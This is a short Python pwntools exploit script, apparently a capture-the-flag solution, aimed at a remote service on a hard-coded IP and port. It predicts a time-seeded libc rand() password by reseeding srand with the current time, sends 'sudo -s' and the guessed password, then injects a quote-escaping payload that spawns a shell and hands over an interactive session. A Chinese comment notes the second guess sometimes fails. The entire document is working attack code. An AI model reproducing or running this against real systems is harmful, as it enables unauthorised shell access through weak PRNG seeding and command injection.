from pwn import *
from ctypes import *

context.arch = "amd64"
elf = cdll.LoadLibrary('libc.so.6')

def make_psw(plus):
    elf.srand(time_base+plus)
    s=""
    for i in range(10):
        s+= chr(33 + (elf.rand() % (126 - 32) + 1))
    return s
time_base=elf.time(0)
passwd_list=[]
passwd_list.append(make_psw(0).encode())
passwd_list.append(make_psw(1).encode())
print(passwd_list)

p = remote('140.115.59.7',10004)
pause()
p.send("sudo -s".encode())
pause()
p.send(passwd_list[1])#有時是[0]
pause()
p.send(b"\";\sh ;\"")
p.interactive()
